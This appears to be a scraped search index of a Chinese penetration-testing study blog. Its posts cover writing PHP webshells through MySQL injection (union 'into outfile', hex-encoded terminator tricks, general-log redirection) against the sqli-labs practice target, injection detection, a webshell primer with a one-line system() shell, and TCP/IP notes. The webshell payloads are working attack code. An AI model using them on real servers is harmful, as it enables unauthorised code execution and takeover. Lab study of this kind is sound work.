VARIABLES LIKE &quot;secure_file_priv&quot;;secure-file-priv; 目前环境下的值为NULL，即不允许导入导出。 经查资料，secure-file-priv的值的： （1）NULL，表示禁止。 （2）如果value值有文件夹目录，则表示只允许该目录下文件（PS：测试子目录也不行）。 （3）如果为空，则表示不限制目录。 可以在mysql的配置文件中（Windows下为my.ini, Linux下的my.cnf），修改值（如果没有就自己加上）。这里直接设置为不限制目录，然后重启数据库： 这里踩了很久的坑，使用phpstudy的mysql，如果直接用Windows的笔记本打开my.ini，会导致后续数据库启动失败。 然后查看是否修改成功： Getshell 1、利用 union select 当注入点为union注入时，利用 union select &quot;一句话木马&quot; into outfile '物理路径/xxx.php'，将一句话导出到xxx.php中。 ?id=1 union select 1,&quot;&lt;?php @eval($_POST['passwd']);?&gt;&quot;,3 into outfile 'G:/Tools/phpstudy_pro/WWW/sqli-labs/webshell.php'-- ?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile &quot;G:/Tools/phpstudy_pro/WWW/sqli-labs/webshell.php&quot;-- 2、利用 OPETIONS（分隔符） 当Mysql注入点为盲注或报错注入时，union select 的写入方式不可行。 通过添加OPTIONS直接在Sql语句后面写入一句话（常用的四种都可使用）： ?id=1 LIMIT 0,1 INTO OUTFILE 'G:/Tools/phpstudy_pro/WWW/sqli-labs/evil.php' lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 -- ?id=1 INTO OUTFILE '物理路径' lines terminated by （一句话hex编码）# ?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）# ?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）# ?id=1 INTO OUTFILE '物理路径' lines starting by （一句话hex编码）# 3、日志getshell 新版本的MySQL设置了secure_file_priv导出文件的路径，所以无法通过使用select into outfile来写入一句话。也很难去修改Mysql的配置文件。 该环境下还可以通过修改MySQL的log文件来获取Webshell。当开启日志后，Mysql会记录执行的SQL语句，通过把Webshell写入日志的方式来利用。 环境条件： 数据库用户：Super和File服务器权限 物理路径：G:/Tools/phpstudy_pro/WWW/log.php 步骤 连接上Mysql后，执行如下命令： //1、查询日志情况： show variables like '%general%'; //2、开启日志general log： set global general_log = on; //3、设置日志路径 set global general_log_file = 'G:/Tools/phpstudy_pro/WWW/webshell.php'; //4、写Webshell select '&lt;?php eval($_GET[passwd]);?&gt;' //5、关闭日志 set global general_log=off; 靶场练习 1、环境搭建 靶场：https://github.com/Audi-1/sqli-labs 环境：phpstudy集成环境（Windows + Mysql + php + Apache） 数据库连接用户：root secure_file_priv：secure_file_priv = 此外在靶场网站路径下准备一个phpinfo.php（获取网站绝对路径使用） 2、测试 注入点如下： http://192.168.31.128/sqli-labs/Less-1/?id=1 进行简单的sql注入检测： 通过单引号触发sql语法报错，得到以下信息： Mysql数据库 参数是单引号闭合 进一步通过布尔逻辑来验证注入点： 证实该注入点的存在。 有明显的数据回显，先试一试union注入是否可以： order by 测试字段数 字段3排序正常，字段4报错，可以得出数据库表有三个字段。 union select 测试回显字段是多少 http://192.168.31.128/sqli-labs/Less-1/?id=-1' union select 1,2,3--+ 可以看出回显到前端的字段是2和3。 因为是练习Getshell，就不进行后续的数据爆破。为了Getshell，需要先收集目标相关的信息，通过上面的报错我们了解到目标数据库为Mysql，下面利用Mysql的一些系统函数来收集一些信息： http://192.168.31.128/sqli-labs/Less-1/?id=-1' union select 1,concat_ws(',',user(),@@version_compile_os),3--+ 得到信息如下： 数据库连接用户：root （权限够了） 操作系统：Windows 目前为止，还差网站的绝对路径，可以通过报错，phpinfo界面，404界面等一些方式去搜集。 这里用burpsuite扫一下目录，发现了phpinfo： 然后打开就能收集到网站绝对路径了： 至此Getshell所需的信息基本搜集的差不多了。 Getshell： http://192.168.31.128/sqli-labs/Less-1/?id=1' union select 1,&quot;&lt;?php @eval($_POST['passwd']);?&gt;&quot;,3 into outfile 'G:/Tools/phpstudy_pro/WWW/sqli-labs/webshell.php'--+ 使用Webshell管理工具连接： ","link":"https://zzggtt.github.io/post/mysql-zhu-ru-dian-xie-webshell/"},{"title":"Mysql手工注入检测和基础函数","content":"注入检测 一、Mysql基础 Mysql的逻辑架构图： 下面的内容采用如下源码进行分析： //源码（sqli-labs）: $sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;; //对应的sql语句 : SELECT * FROM users WHERE id='1'' LIMIT 0,1 分析器 MySQL的分析器从输入的&quot;select&quot;这个关键字识别出来，这是一个查询语句。它也要把字符串“T”识别成“表名T”，把字符串“ID”识别成“列ID”。做完了这些识别以后，就要做“语法分析”。根据词法分析的结果，语法分析器会根据语法规则，判断你输入的这个SQL语句是否满足MySQL语法。如果你的语句不对，就会收到“You have an error in your SQL syntax”的错误提醒。 举个例子：比如下面这个语句select少打了开头的字母“s” 执行器 MySQL通过分析器知道了你要做什么，通过优化器知道了该怎么做，于是就进入了执行器阶段，开始执行语句。 Mysql 逻辑与或运算 逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。 参考：https://www.runoob.com/mysql/mysql-operator.html 我自己的理解： AND：一假即假 OR：一真即真 自己多实践一些例子就能理解： user表结构： 二、触发mysql语法错误 检测注入 常见的通过触发语法错误来检测注入的方式（是否成对匹配）： ' False '' True &quot; False &quot;&quot; True \\ False \\ True http://127.0.0.1/sqli-labs/Less-1/?id=1' http://127.0.0.1/sqli-labs/Less-1/?id=1\\ http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; 三、通过逻辑运算 检测注入 以如下SQL语句为例： SELECT * FROM users WHERE id = 1; AND 1 True AND 0 False id=3-1 返回2的数据即为True id=1*3 返回3的数据即为True 基础函数 Mysql常用系统函数 version() #MySQL版本 user() #数据库用户名 database() #数据库名 @@datadir #数据库路径 @@version_compile_os #操作系统版本 Mysql连接函数 函数具体介绍以及使用，参考：https://www.cnblogs.com/lcamry/p/5715634.html 当我们使用union注入去获取数据库相关数据时，由于union select的特性，获取一条数据时不会又太大影响，例如： SELECT * FROM users WHERE id='1' UNION SELECT 1,user(),3 但是想要获取多条数据时，例如： SELECT * FROM users WHERE id='1' UNION SELECT 1,schema_name,3 FROM information_schema.SCHEMATA 以sqli-labs靶场源码为例，通常服务端是这样写的： $sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;; $result=mysqli_query($con1, $sql); 结果就是这样的： 就只能爆出LIMIT 0,1 的数据。 所以通过使用连接函数来爆破多条数据： SELECT * FROM users WHERE id='-1' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.SCHEMATA LIMIT 0,1 ","link":"https://zzggtt.github.io/post/mysql-shou-gong-zhu-ru-jian-ce-he-ji-chu-han-shu/"},{"title":"初识Webshell","content":"Webshell 1、Shell Shell是一个 命令解释器 ：用于接收使用者输入的指令，并送入内核去执行。解释使用者输入的指令。是一种为使用者提供操作界面的软件。 基本上分为两大类： 图像界面shell 应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。 命令式shell Unix/linux 系统：bash / sh / ksh / csh / zsh Winodws系统：cmd.exe、PowerShell 2、Webshell Webshell是一种Web形式的命令解释器，以asp、jsp、php或者cgi等动态脚本语言编写一种执行系统代码的环境。通过浏览器访问网站服务器Web目录下的Webshell，输入指令，来达到管理目标网站的服务器。 以最简单的php webshell为例： &lt;?php system($_GET('command')); ?&gt; 通过GET方式comand参数来接收传递命令，然后交由system函数执行命令。 3、Webshell分类 4、Webshell管理工具 在以前菜刀没有出现的时候，我们想要获取 webshell 的时候，通常都是直接上传一个 web 木马并且直接用这个木马进行管理，由于这种大型木马的体量比较大，上传过程中容易被检测且不方便进行上传绕过测试，所以大家就想了一个办法，先上传一个体量小，功能少的小型木马然后再通过小马的简单的上传或者文件修改等单个功能进行大马的上传。小马的功能通常是围绕文件管理的功能，比较简单，如：文件上传、文件修改、新建文件等，都是围绕方便上传一个体量大的木马来做的。自从菜刀出现之后，渐渐的一句话木马成为了主流，体量小，还有一个界面版的客户端进行管理操作，极大的方便的大家对于 web 服务器的管理。 上传完大马后，直接访问对应位置即可进行相应管理： 而一句话木马则提供了一个界面版的客户端进行管理操作，极大的方便的大家对于Web服务器的管理： 常见的Webshell管理工具：https://www.cnblogs.com/xiaozi/p/12397211.html 参考：https://mp.weixin.qq.com/s/x2Tw3ukaTFDJvZ0YCuZBog ","link":"https://zzggtt.github.io/post/chu-shi-webshell/"},{"title":"《图解TCP/IP》读书笔记","content":"前言 了解TCP/IP是对渗透测试很有必要的，下面是我阅读完《图解TCP/IP》后，记录的一些重要的知识点。 （随着我的渗透测试学习，将会持续更新！！！） TCP/IP概述 1、含义 互联网在进行通信时，需要相应的网络协议，而在网络中被广泛使用的TCP/IP协议。TCP/IP协议在多数情况下指的是：利用IP进行通信时所必须用到的协议群的统称。 2、分层模型 OSI参考模型注重“通信协议必要的功能是什么”，而TCP/IP则更强调“在计算机上实现协议应该开放哪种程序” 硬件层 TCP/IP的最底层的主要作用是负责数据传递的硬件。 网卡层 网卡层也称网络接口层，可以理解为“驱动程序”。它是硬件与操作系统之间的桥梁。计算机的外设不是直接插上就能使用的，还需要“驱动程序”的支持。所以通常需要在操作系统上安装一些驱动程序软件，才能使用这些附加硬件。 互联网层 互联网层使用IP协议，IP协基于IP地址转发分发数据。 传输层 传输层的主要功能是让应用程序软件之间实现通信，它具有来个代表性的协议：TCP、UDP。 应用层 TCP/IP的应用层把OSI参考模型中的会话层、表示层、应用层的功能都集中到应用程序软件中来实现。TCP/IP应用的架构绝大数属于C/S架构。 提供服务的应用程序叫做服务端，接收服务的应用程序叫做客户端。在这种通信模式中，提供服务的程序会被预先部署到服务器主机上，等待接收任何时刻客户端发送的请求。 WWW 在WWW中，用户通过Web浏览器（客户端），就可以访问存储在Web服务器上的各种信息。Web浏览器和Web服务器之间的通信协议是HTTP（应用层协议），所传输的数据的主要格式是HTML（表示层协议）。 电子邮件 电子邮件之在网络上发送邮件，发送邮件的通信协议是SMPT（应用层协议）。起初只能发送文本格式，然而现在电子邮件由MIME协议（表示层协议）拓展后，就可以发送声音、图片等各式各样的信息。 文件传输 文件传输协议是指将保存在其他计算机硬盘上的文件传输到本地硬盘上，该过程使用的协议是FTP。 远程登陆 远程登陆指的是登录到远程的计算机上。在TCP/IP中常用TELNET和SSH两种协议。 3、通信示例 地址的唯一性 在TCP/IP或UDP/IP通信中，通常采用5个信息来识别一个通信。分别是：“源IP地址”、“目标IP地址”、“协议号”、“源端口地址”、“目标端口地址”。 基础概念 端口 在传输层中，用于识别一台计算机中正在运行的不同的应用程序。 IP地址 在网络层中，用于识别TCP/IP网络中互联的主机和路由器。 MAC地址 在数据链层路中，用于是被同一链路中不同的计算机。 端口 一台计算机中可以同时运行多个应用程序，例如Web浏览器、远程登陆用的SSH客户端等待。而传输层协议（TCP、UDP）正式利用端口号来识别不同的应用程序，并准确的将数据传输。 常见的端口对应的服务：https://www.shentoushi.top/Public/upload/images/2017-07-09/Baidu_translation_table.png IP地址 IP协议作为整个TCP/IP中至关重要的协议，主要作用是在复杂的网络环境中将数据包发送给最终的目标计算机。能够让任意两台计算机之间进行通讯。 在TCP/IP通信中，所有主机或路由器必须设定IP地址。IP地址的作用在于从连接到互联网中的所有主机中，识别出进行通信的目标地址。 组成 IP地址由“网络地址”和“主机地址”两部分组成。 网络地址代表不同的网段，而主机地址代表同一网段中的不同的主机。 分类 全局地址和私有地址 随着互联网的普及，IP地址不足的问题日趋显著，于是出现了一种技术：在每个独立的网络中，只为相应的设备分配唯一的IP地址，对于哪些没有连接尽互联网中的主机，只需要保证在整个独立的网络中地址唯一即可。 这些地址称为私有地址，范围如下： NAT技术 私有IP地址最早没有计划连接互联网，而只是用于互联网之外的独立网络。然而随着NAT技术的出现，配置私有IP的主机也能与互联网中的主机进行通信。 NAT技术是一种能够互换私有IP地址与全局IP地址的技术。 当独立网络内部有多台机器同时要与外部通讯时，仅仅转换IP地址是不够用的，此时采用包含端口号一起转换的方式（NAPT）即可解决。 MAC地址 MAC地址用于识别数据链路中互连的节点。 ","link":"https://zzggtt.github.io/post/lesslesstu-jie-tcpipgreatergreater-du-shu-bi-ji/"},{"title":"关于","content":" 📝温故而知新 📒 twitter：https://twitter.com/Zer0ney1 📙 wechat：z807852704 ","link":"https://zzggtt.github.io/post/about/"}]}